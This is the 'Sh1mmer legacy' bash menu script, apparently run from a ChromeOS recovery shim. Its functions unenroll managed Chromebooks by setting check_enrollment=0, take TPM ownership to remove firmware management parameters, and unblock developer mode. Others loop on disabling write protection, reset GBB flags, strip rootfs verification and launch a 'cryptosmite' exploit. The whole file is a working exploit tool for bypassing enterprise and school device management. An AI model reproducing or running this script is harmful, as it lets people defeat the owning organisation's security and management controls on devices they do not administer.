#!/bin/bash

set -eE

SCRIPT_DATE="[2024-01-28]"

COLOR_RESET="\033[0m"
COLOR_BLACK_B="\033[1;30m"
COLOR_RED_B="\033[1;31m"
COLOR_GREEN="\033[0;32m"
COLOR_GREEN_B="\033[1;32m"
COLOR_YELLOW="\033[0;33m"
COLOR_YELLOW_B="\033[1;33m"
COLOR_BLUE_B="\033[1;34m"
COLOR_MAGENTA_B="\033[1;35m"
COLOR_CYAN_B="\033[1;36m"

get_largest_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			largest="/dev/$dev_name"
			size="$tmp_size"
		fi
	done
	echo "$largest"
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -l -o name "/dev/$dev_name" 2>/dev/null)" in
				*STATE*KERN-A*ROOT-A*KERN-B*ROOT-B*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

format_part_number() {
	echo -n "$1"
	echo "$1" | grep -q '[0-9]$' && echo -n p
	echo "$2"
}

poll_key() {
	local held_key
	# dont need enable_input here
	# read will return nonzero when no key pressed
	# discard stdin
	read -r -s -n 10000 -t 0.1 held_key || :
	read -r -s -n 1 -t 0.1 held_key || :
	echo "$held_key"
}

deprovision() {
	echo "Deprovisioning..."
	vpd -i RW_VPD -s check_enrollment=0
	unblock_devmode
}

reprovision() {
	echo "Reprovisioning..."
	vpd -i RW_VPD -s check_enrollment=1
}

unblock_devmode() {
	echo "Unblocking devmode..."
	vpd -i RW_VPD -s block_devmode=0
	crossystem block_devmode=0
	local res
	res=$(cryptohome --action=get_firmware_management_parameters 2>&1)
	if [ $? -eq 0 ] && ! echo "$res" | grep -q "Unknown action"; then
		tpm_manager_client take_ownership
		cryptohome --action=remove_firmware_management_parameters
	fi
}

enable_usb_boot() {
	echo "Enabling USB/altfw boot"
	crossystem dev_boot_usb=1
	crossystem dev_boot_legacy=1 || :
	crossystem dev_boot_altfw=1 || :
}

reset_gbb_flags() {
	echo "Resetting GBB flags... This will only work if WP is disabled"
	/usr/share/vboot/bin/set_gbb_flags.sh 0x0
}

wp_disable() {
	while :; do
		if flashrom --wp-disable; then
			echo -e "${COLOR_GREEN_B}Success. Note that some devices may need to reboot before the chip is fully writable.${COLOR_RESET}"
			return 0
		fi
		echo -e "${COLOR_RED_B}Press SHIFT+Q to cancel.${COLOR_RESET}"
		if [ "$(poll_key)" = "Q" ]; then
			printf "\nCanceled\n"
			return 1
		fi
		sleep 1
	done
}

touch_developer_mode() {
	local cros_dev="$(get_largest_cros_blockdev)"
	if [ -z "$cros_dev" ]; then
		echo "No CrOS SSD found on device!"
		return 1
	fi
	echo "This will bypass the 5 minute developer mode delay on ${cros_dev}"
	echo "Continue? (y/N)"
	read -r action
	case "$action" in
		[yY]) : ;;
		*) return ;;
	esac
	local stateful=$(format_part_number "$cros_dev" 1)
	local stateful_mnt=$(mktemp -d)
	mount "$stateful" "$stateful_mnt"
	touch "$stateful_mnt/.developer_mode"
	umount "$stateful_mnt"
	rmdir "$stateful_mnt"
}

disable_verity() {
	local cros_dev="$(get_largest_cros_blockdev)"
	if [ -z "$cros_dev" ]; then
		echo "No CrOS SSD found on device!"
		return 1
	fi
	echo "READ THIS!!!!!! DON'T BE STUPID"
	echo "This script will disable rootfs verification. What does this mean? You'll be able to edit any file on the chromebook, useful for development, messing around, etc"
	echo "IF YOU DO THIS AND GO BACK INTO VERIFIED MODE (press the space key when it asks you to on the boot screen) YOUR CHROMEBOOK WILL STOP WORKING AND YOU WILL HAVE TO RECOVER"
	echo ""
	echo "This will disable rootfs verification on ${cros_dev} ..."
	sleep 4
	echo "Do you still want to do this? (y/N)"
	read -r action
	case "$action" in
		[yY]) : ;;
		*) return ;;
	esac
	/usr/share/vboot/bin/make_dev_ssd.sh -i "$cros_dev" --remove_rootfs_verification
}

cryptosmite() {
	/usr/sbin/cryptosmite_sh1mmer.sh
}

factory() {
	clear
	/usr/sbin/factory_install_backup.sh
}

tetris() {
	clear
	vitetris
}

splash() {
	printf "${COLOR_GREEN_B}"
	echo "ICBfX18gXyAgXyBfIF9fICBfXyBfXyAgX18gX19fIF9fXyAKIC8gX198IHx8IC8gfCAgXC8gIHwgIFwvICB8IF9ffCBfIFwKIFxfXyBcIF9fIHwgfCB8XC98IHwgfFwvfCB8IF98fCAgIC8KIHxfX18vX3x8X3xffF98ICB8X3xffCAgfF98X19ffF98X1wKCg==" | base64 -d
	printf "${COLOR_RESET}"
}

credits() {
	echo "CREDITS:"
	echo "CoolElectronics#4683 - Pioneering this wild exploit"
	echo "ULTRA BLUE#1850 - Testing & discovering how to disable shim rootfs verification"
	echo "Unciaur#1408 - Found the inital RMA shim"
	echo "TheMemeSniper#6065 - Testing"
	echo "Rafflesia#8396 - Hosting files"
	echo "Bypassi#7037 - Helped with the website"
	echo "r58Playz#3467 - Helped us set parts of the shim & made the initial GUI script"
	echo "OlyB#9420 - Scraped additional shims + this legacy script"
	echo "Sharp_Jack#4374 - Created wax & compiled the first shims"
	echo "ember#0377 - Helped with the website"
	echo "Mark - Technical Understanding and Advisory into the ChromeOS ecosystem"
}

run_task() {
	if "$@"; then
		echo "Done."
	else
		echo "TASK FAILED."
	fi
	echo "Press enter to return to the main menu."
	read -res
}

printf "\033[?25h"

while true; do
	clear
	splash
	echo "Welcome to Sh1mmer legacy."
	echo "Script date: ${SCRIPT_DATE}"
	echo "https://github.com/MercuryWorkshop/sh1mmer"
	echo ""
	echo "Select an option:"
	echo "(b) Bash shell"
	echo "(d) Deprovision device"
	echo "(r) Reprovision device"
	echo "(m) Unblock devmode"
	echo "(u) Enable USB/altfw boot"
	echo "(g) Reset GBB flags (in case of an accidental bootloop) WP MUST BE DISABLED"
	echo "(w) WP disable loop (for pencil method)"
	echo "(h) Touch .developer_mode (skip 5 minute delay)"
	echo "(v) Remove rootfs verification"
	echo "(s) Cryptosmite"
	echo "(t) Call chromeos-tpm-recovery"
	echo "(f) Continue to factory installer"
	echo "(i) Tetris"
	echo "(c) Credits"
	echo "(e) Exit and reboot"
	read -rep "> " choice
	case "$choice" in
	[bB]) run_task bash ;;
	[dD]) run_task deprovision ;;
	[rR]) run_task reprovision ;;
	[mM]) run_task unblock_devmode ;;
	[uU]) run_task enable_usb_boot ;;
	[gG]) run_task reset_gbb_flags ;;
	[wW]) run_task wp_disable ;;
	[hH]) run_task touch_developer_mode ;;
	[vV]) run_task disable_verity ;;
	[sS]) run_task cryptosmite ;;
	[tT]) run_task chromeos-tpm-recovery ;;
	[fF]) run_task factory ;;
	[iI]) run_task tetris ;;
	[cC]) run_task credits ;;
	[eE]) break ;;
	*) echo "Invalid option" ;;
	esac
	echo ""
done

printf "\033[?25l"
clear
splash
credits
echo ""
echo "Reboot in 5 seconds."
sleep 5
echo "Rebooting..."
reboot
sleep infinity
